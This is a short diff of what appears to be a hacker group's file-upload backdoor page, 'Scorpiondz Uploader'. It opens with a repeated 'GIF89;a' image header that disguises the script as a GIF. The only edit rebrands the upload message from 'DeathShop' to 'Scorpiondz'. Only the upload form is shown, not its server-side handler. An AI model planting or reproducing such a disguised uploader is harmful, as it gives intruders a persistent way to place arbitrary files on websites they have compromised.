@@ -14,7 +14,7 @@ GIF89;aGIF89;aGIF89;a
 </head>
 <body><h1>Scorpiondz Uploader</h1>
 <form enctype='multipart/form-data' action='' method='POST'>
-<p>DeathShop Uploaded</p>
+<p>Scorpiondz Uploaded</p>
 <input type='file' name='uploaded_file'></input><br />
 <input type='submit' value='Upload'></input>
 </form>
